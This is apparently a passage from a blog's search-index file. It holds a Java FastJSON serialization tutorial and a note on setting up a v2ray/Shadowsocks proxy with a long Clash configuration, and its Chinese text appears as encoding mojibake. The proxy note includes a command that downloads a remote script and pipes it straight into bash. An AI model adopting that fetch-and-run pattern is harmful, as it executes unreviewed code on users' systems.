      </categories>
      <tags>
        <tag>chaos</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJSON</title>
    <url>/2021/12/21/Java/FastJSON/</url>
    <content><![CDATA[<h1 id="FastJSON"><a href="#FastJSON" class="headerlink" title="FastJSON"></a>FastJSON</h1><h3 id="å°†Javaå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼"><a href="#å°†Javaå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼" class="headerlink" title="å°†Javaå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼"></a>å°†Javaå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">     </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;AGE&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;FULL NAME&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;DATE OF BIRTH&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date dateOfBirth;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> age, String fullName, Date dateOfBirth)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.fullName= fullName;</span><br><span class="line">        <span class="built_in">this</span>.dateOfBirth = dateOfBirth;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// æ ‡å‡† getters &amp; setters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> List&lt;Person&gt; listOfPersons = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Person&gt;();</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUp</span><span class="params">()</span> &#123;</span><br><span class="line">    listOfPersons.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">15</span>, <span class="string">&quot;John Doe&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">    listOfPersons.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">20</span>, <span class="string">&quot;Janette Doe&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">whenJavaList_thanConvertToJsonCorrect</span><span class="params">()</span> &#123;</span><br><span class="line">    String jsonOutput= JSON.toJSONString(listOfPersons);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç»“æœ</span></span><br><span class="line">[  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="string">&quot;AGE&quot;</span>:<span class="number">15</span>,</span><br><span class="line">        <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1468962431394</span>,</span><br><span class="line">        <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;John Doe&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="string">&quot;AGE&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1468962431394</span>,</span><br><span class="line">        <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Janette Doe&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h2 id="Stringè½¬åŒ–ä¸ºJSONObject"><a href="#Stringè½¬åŒ–ä¸ºJSONObject" class="headerlink" title="Stringè½¬åŒ–ä¸ºJSONObject"></a>Stringè½¬åŒ–ä¸ºJSONObject</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject1</span> <span class="operator">=</span>JSONObject.parseObject(String)</span><br></pre></td></tr></table></figure>



<h3 id="åˆ›å»ºJSONå¯¹è±¡"><a href="#åˆ›å»ºJSONå¯¹è±¡" class="headerlink" title="åˆ›å»ºJSONå¯¹è±¡"></a>åˆ›å»ºJSONå¯¹è±¡</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">whenGenerateJson_thanGenerationCorrect</span><span class="params">()</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line">    <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;AGE&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;FULL NAME&quot;</span>, <span class="string">&quot;Doe &quot;</span> + i);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;DATE OF BIRTH&quot;</span>, <span class="string">&quot;2016/12/12 12:12:12&quot;</span>);</span><br><span class="line">        jsonArray.add(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonOutput</span> <span class="operator">=</span> jsonArray.toJSONString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç»“æœ</span></span><br><span class="line">[</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="string">&quot;AGE&quot;</span>:<span class="string">&quot;10&quot;</span>,</span><br><span class="line">      <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;2016/12/12 12:12:12&quot;</span>,</span><br><span class="line">      <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Doe 0&quot;</span></span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="string">&quot;AGE&quot;</span>:<span class="string">&quot;10&quot;</span>,</span><br><span class="line">      <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;2016/12/12 12:12:12&quot;</span>,</span><br><span class="line">      <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Doe 1&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="JSONObject-è½¬å¯¹è±¡"><a href="#JSONObject-è½¬å¯¹è±¡" class="headerlink" title="JSONObject è½¬å¯¹è±¡"></a>JSONObject è½¬å¯¹è±¡</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IdentifyRequest</span> <span class="variable">identifyRequest</span> <span class="operator">=</span> JSON.toJavaObject(jsonObject, IdentifyRequest.class);</span><br></pre></td></tr></table></figure>

<h2 id="ObjectMapper"><a href="#ObjectMapper" class="headerlink" title="ObjectMapper"></a>ObjectMapper</h2><p>fastJson æ²¡æœ‰é©¼å³°å¯¹åº”è§„åˆ™</p>
<p><a href="https://www.jb51.net/article/121697.htm">https://www.jb51.net/article/121697.htm</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>æ­å»ºæ¢¯å­</title>
    <url>/2022/01/14/Chaos/%E6%90%AD%E5%BB%BA%E6%A2%AF%E5%AD%90/</url>
    <content><![CDATA[<h1 id="æ­å»ºæ¢¯å­"><a href="#æ­å»ºæ¢¯å­" class="headerlink" title="æ­å»ºæ¢¯å­"></a>æ­å»ºæ¢¯å­</h1><p><code>v2ray info</code> æŸ¥çœ‹ V2Ray é…ç½®ä¿¡æ¯<br><code>v2ray config</code> ä¿®æ”¹ V2Ray é…ç½®<br><code>v2ray link</code> ç”Ÿæˆ V2Ray é…ç½®æ–‡ä»¶é“¾æ¥<br><code>v2ray infolink</code> ç”Ÿæˆ V2Ray é…ç½®ä¿¡æ¯é“¾æ¥<br><code>v2ray qr</code> ç”Ÿæˆ V2Ray é…ç½®äºŒç»´ç é“¾æ¥<br><code>v2ray ss</code> ä¿®æ”¹ Shadowsocks é…ç½®<br><code>v2ray ssinfo</code> æŸ¥çœ‹ Shadowsocks é…ç½®ä¿¡æ¯<br><code>v2ray ssqr</code> ç”Ÿæˆ Shadowsocks é…ç½®äºŒç»´ç é“¾æ¥<br><code>v2ray status</code> æŸ¥çœ‹ V2Ray è¿è¡ŒçŠ¶æ€<br><code>v2ray start</code> å¯åŠ¨ V2Ray<br><code>v2ray stop</code> åœæ­¢ V2Ray<br><code>v2ray restart</code> é‡å¯ V2Ray<br><code>v2ray log</code> æŸ¥çœ‹ V2Ray è¿è¡Œæ—¥å¿—<br><code>v2ray update</code> æ›´æ–° V2Ray<br><code>v2ray update.sh</code> æ›´æ–° V2Ray ç®¡ç†è„šæœ¬<br><code>v2ray uninstall</code> å¸è½½ V2Ray</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ä¹°æœåŠ¡å™¨</span></span><br><span class="line"></span><br><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ‰‹æœºå®‰è£… shadowracket</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç”µè„‘å®‰è£… clashX</span></span><br><span class="line">æ·»åŠ ä¸€ä¸‹é…ç½®æ–‡ä»¶</span><br><span class="line"><span class="meta"># </span><span class="language-bash">HTTP ç«¯å£</span></span><br><span class="line">port: 7890</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">SOCKS5 ç«¯å£</span></span><br><span class="line">socks-port: 7891</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Linux åŠ macOS çš„ redir ç«¯å£</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">redir-port: 7892</span></span><br><span class="line"></span><br><span class="line">allow-lan: false</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä»…é€‚ç”¨äºè®¾ç½® allow-lan ä¸º <span class="literal">true</span> æ—¶</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">&quot;*&quot;</span>: ç»‘å®šæ‰€æœ‰ IP åœ°å€</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">192.168.122.11: ç»‘å®šå•ä¸ª IPv4 åœ°å€</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">&quot;[aaaa::a8aa:ff:fe09:57d8]&quot;</span>: ç»‘å®šå•ä¸ª IPv6 åœ°å€</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">bind-address: <span class="string">&quot;*&quot;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Rule / Global / Direct (é»˜è®¤ä¸º Rule æ¨¡å¼)</span></span><br><span class="line">mode: Rule</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è®¾ç½®è¾“å‡ºæ—¥å¿—çš„ç­‰çº§ (é»˜è®¤ä¸º info)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">info / warning / error / debug / silent</span></span><br><span class="line">log-level: info</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">RESTful API <span class="keyword">for</span> clash</span></span><br><span class="line">external-controller: 127.0.0.1:9090</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">you can put the static web resource (such as clash-dashboard) to a directory, and clash would serve <span class="keyword">in</span> `<span class="variable">$&#123;API&#125;</span>/ui`</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">input is a relative path to the configuration directory or an absolute path</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">external-ui: folder</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Secret <span class="keyword">for</span> RESTful API (Optional)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">secret: <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®éªŒæ€§åŠŸèƒ½</span></span><br><span class="line">experimental:</span><br><span class="line">  ignore-resolve-fail: true # å¿½ç•¥ DNS è§£æå¤±è´¥ï¼Œé»˜è®¤å€¼ä¸ºtrue</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">interface-name: en0 <span class="comment"># å‡ºç«™æ¥å£åç§°</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æœ¬åœ° SOCKS5/HTTP(S) æœåŠ¡å™¨è®¤è¯</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">authentication:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"> - <span class="string">&quot;user1:pass1&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"> - <span class="string">&quot;user2:pass2&quot;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="comment"># å®éªŒæ€§ hosts, æ”¯æŒé€šé…ç¬¦ï¼ˆå¦‚ *.clash.dev ç”šè‡³ *.foo.*.examplex.com ï¼‰</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="comment"># é™æ€åŸŸçš„ä¼˜å…ˆçº§é«˜äºé€šé…ç¬¦åŸŸï¼ˆfoo.example.com &gt; *.example.comï¼‰</span></span></span><br><span class="line">hosts:</span><br><span class="line">  &#x27;mtalk.google.com&#x27;: 108.177.125.188</span><br><span class="line"><span class="meta"># </span><span class="language-bash">  <span class="string">&#x27;*.clash.dev&#x27;</span>: 127.0.0.1</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  <span class="string">&#x27;alpha.clash.dev&#x27;</span>: <span class="string">&#x27;::1&#x27;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">dns:</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="built_in">enable</span>: <span class="literal">true</span> <span class="comment"># set true to enable dns (default is false)</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">ipv6: <span class="literal">false</span> <span class="comment"># default is false</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">listen: 0.0.0.0:53</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="comment"># default-nameserver: # resolve dns nameserver host, should fill pure IP</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="comment">#   - 114.114.114.114</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="comment">#   - 8.8.8.8</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">enhanced-mode: redir-host <span class="comment"># or fake-ip</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash"><span class="comment"># fake-ip-range: 198.18.0.1/16 # if you don&#x27;t know what it is, don&#x27;t change it</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">fake-ip-filter: <span class="comment"># fake ip white domain list</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - <span class="string">&#x27;*.lan&#x27;</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - localhost.ptlogin2.qq.com</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">nameserver:</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - 114.114.114.114</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - tls://dns.rubyfish.cn:853 <span class="comment"># dns over tls</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - https://1.1.1.1/dns-query <span class="comment"># dns over https</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">fallback: <span class="comment"># concurrent request with nameserver, fallback used when GEOIP country isn&#x27;t CN</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  - tcp://1.1.1.1</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">fallback-filter:</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  geoip: <span class="literal">true</span> <span class="comment"># default</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  ipcidr: <span class="comment"># ips in these subnets will be considered polluted</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">    - 240.0.0.0/4</span></span><br><span class="line"></span><br><span class="line">proxies:</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ”¯æŒçš„åè®®åŠåŠ å¯†ç®—æ³•ç¤ºä¾‹è¯·æŸ¥é˜… Clash é¡¹ç›® README ä»¥ä½¿ç”¨æœ€æ–°æ ¼å¼ï¼šhttps://github.com/Dreamacro/clash/blob/master/README.md</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Shadowsocks æ”¯æŒçš„åŠ å¯†æ–¹å¼:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  aes-128-gcm aes-192-gcm aes-256-gcm</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  aes-128-cfb aes-192-cfb aes-256-cfb</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  aes-128-ctr aes-192-ctr aes-256-ctr</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  rc4-md5 chacha20-ietf xchacha20</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  chacha20-ietf-poly1305 xchacha20-ietf-poly1305</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Shadowsocks</span></span><br><span class="line">- name: &quot;ss&quot;</span><br><span class="line">  type: ss</span><br><span class="line">  server: server</span><br><span class="line">  port: 443</span><br><span class="line">  cipher: chacha20-ietf-poly1305</span><br><span class="line">  password: &quot;password&quot;</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">udp: <span class="literal">true</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Shadowsocks(simple-obfs)</span></span><br><span class="line">- name: &quot;ss-obfs&quot;</span><br><span class="line">  type: ss</span><br><span class="line">  server: server</span><br><span class="line">  port: 443</span><br><span class="line">  cipher: chacha20-ietf-poly1305</span><br><span class="line">  password: &quot;password&quot;</span><br><span class="line">  plugin: obfs</span><br><span class="line">  plugin-opts:</span><br><span class="line">      mode: tls</span><br><span class="line">      host: example.com</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Shadowsocks(v2ray-plugin)</span></span><br><span class="line">- name: &quot;ss-v2ray&quot;</span><br><span class="line">  type: ss</span><br><span class="line">  server: server</span><br><span class="line">  port: 443</span><br><span class="line">  cipher: chacha20-ietf-poly1305</span><br><span class="line">  password: &quot;password&quot;</span><br><span class="line">  plugin: v2ray-plugin</span><br><span class="line">  plugin-opts:</span><br><span class="line">    mode: websocket # no QUIC now</span><br><span class="line">    # tls: true # wss</span><br><span class="line">    # skip-cert-verify: true</span><br><span class="line">    # host: bing.com</span><br><span class="line">    # path: &quot;/&quot;</span><br><span class="line">    # mux: true</span><br><span class="line">    # headers:</span><br><span class="line">    #   custom: value</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">VMess</span></span><br><span class="line">- name: &quot;v2ray&quot;</span><br><span class="line">  type: vmess</span><br><span class="line">  server: ****ï¼ˆå¡«å†™è‡ªå·±çš„ï¼‰</span><br><span class="line">  port: ***ï¼ˆå¡«å†™è‡ªå·±çš„ï¼‰</span><br><span class="line">  uuid: 30750937-2ed5-4782-9e66-6fc61ea7e4f3</span><br><span class="line">  alterId: 0</span><br><span class="line">  cipher: auto</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">udp: <span class="literal">true</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">tls: <span class="literal">true</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">skip-cert-verify: <span class="literal">true</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">tls-hostname: å¡«å†™ä¼ªè£…åŸŸå</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">network: ws</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">ws-path: /path</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">ws-headers: <span class="comment">#è¿™ä¸€è¡Œåé¢ä¸è¦å†™ä¸œè¥¿</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  Host: v2ray.com <span class="comment"># å¡«å†™ä¼ªè£…åŸŸå</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Trojan</span></span><br><span class="line">- name: &quot;trojan&quot;</span><br><span class="line">  type: trojan</span><br><span class="line">  server: server</span><br><span class="line">  port: 443</span><br><span class="line">  password: password</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">udp: <span class="literal">true</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">sni: example.com <span class="comment"># å¡«å†™ä¼ªè£…åŸŸå</span></span></span><br><span class="line">  alpn:</span><br><span class="line">     - h2</span><br><span class="line">     - http/1.1</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">skip-cert-verify: <span class="literal">true</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä»£ç†ç»„ç­–ç•¥</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç­–ç•¥ç»„ç¤ºä¾‹è¯·æŸ¥é˜… Clash é¡¹ç›® README ä»¥ä½¿ç”¨æœ€æ–°æ ¼å¼ï¼šhttps://github.com/Dreamacro/clash/blob/master/README.md</span></span><br><span class="line">proxy-groups:</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">url-test é€šè¿‡æŒ‡å®šçš„ URL æµ‹è¯•å¹¶é€‰æ‹©å»¶è¿Ÿæœ€ä½çš„èŠ‚ç‚¹</span></span><br><span class="line">- name: &quot;è‡ªåŠ¨é€‰æ‹©å¿«é€ŸèŠ‚ç‚¹&quot;</span><br><span class="line">  type: url-test</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;ss&quot;</span><br><span class="line">    - &quot;ss-obfs&quot;</span><br><span class="line">    - &quot;ss-v2ray&quot;</span><br><span class="line">    - &quot;v2ray&quot;</span><br><span class="line">    - &quot;trojan&quot;</span><br><span class="line">  url: &#x27;http://www.gstatic.com/generate_204&#x27;</span><br><span class="line">  interval: 300</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">fallback é€šè¿‡æŒ‡å®šçš„ URL æµ‹è¯•å¹¶é€‰æ‹©å¯ç”¨çš„èŠ‚ç‚¹ï¼Œå½“ 1 æ•…éšœä¸å¯ç”¨æ—¶è‡ªåŠ¨åˆ‡æ¢åˆ° 2 ä»¥æ­¤ç±»æ¨</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- name: <span class="string">&quot;Fallback&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  <span class="built_in">type</span>: fallback</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  proxies:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  url: <span class="string">&#x27;http://www.gstatic.com/generate_204&#x27;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  interval: 300</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">load-balance: è´Ÿè½½å‡è¡¡</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- name: <span class="string">&quot;LoadBalance&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  <span class="built_in">type</span>: load-balance</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  proxies:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  url: <span class="string">&#x27;http://www.gstatic.com/generate_204&#x27;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  interval: 300</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä»£ç†èŠ‚ç‚¹é€‰æ‹©</span></span><br><span class="line">- name: &quot;PROXY&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;è‡ªåŠ¨é€‰æ‹©å¿«é€ŸèŠ‚ç‚¹&quot;</span><br><span class="line">    - &quot;ss&quot;</span><br><span class="line">    - &quot;ss-obfs&quot;</span><br><span class="line">    - &quot;ss-v2ray&quot;</span><br><span class="line">    - &quot;v2ray&quot;</span><br><span class="line">    - &quot;trojan&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç™½åå•æ¨¡å¼ PROXYï¼Œé»‘åå•æ¨¡å¼ DIRECT</span></span><br><span class="line">- name: &quot;Final&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;DIRECT&quot;</span><br><span class="line">    - &quot;PROXY&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Apple æœåŠ¡ä»£ç†</span></span><br><span class="line">- name: &quot;Apple&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;DIRECT&quot;</span><br><span class="line">    - &quot;PROXY&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å›½é™…æµåª’ä½“æœåŠ¡</span></span><br><span class="line">- name: &quot;GlobalMedia&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;PROXY&quot;</span><br><span class="line">    - &quot;ss&quot;</span><br><span class="line">    - &quot;ss-obfs&quot;</span><br><span class="line">    - &quot;ss-v2ray&quot;</span><br><span class="line">    - &quot;v2ray&quot;</span><br><span class="line">    - &quot;trojan&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¤§é™†æµåª’ä½“é¢å‘æ¸¯æ¾³å°é™å®šæœåŠ¡</span></span><br><span class="line">- name: &quot;HKMTMedia&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;DIRECT&quot;</span><br><span class="line">    - &quot;ss&quot;</span><br><span class="line">    - &quot;ss-obfs&quot;</span><br><span class="line">    - &quot;ss-v2ray&quot;</span><br><span class="line">    - &quot;v2ray&quot;</span><br><span class="line">    - &quot;trojan&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è§„åˆ™</span></span><br><span class="line">rules:</span><br><span class="line"><span class="meta"># </span><span class="language-bash">Unbreak</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Google</span></span><br><span class="line">- DOMAIN-SUFFIX,googletraveladservices.com,DIRECT</span><br><span class="line">- DOMAIN,dl.google.com,DIRECT</span><br><span class="line">- DOMAIN,mtalk.google.com,DIRECT</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Internet Service Providers Hijacking è¿è¥å•†åŠ«æŒ</span></span><br><span class="line">- DOMAIN-SUFFIX,17gouwuba.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,186078.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,189zj.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,285680.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,3721zh.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,4336wang.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,51chumoping.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,51mld.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,51mypc.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,58mingri.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,58mingtian.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,5vl58stm.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,6d63d3.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,7gg.cc,REJECT</span><br><span class="line">- 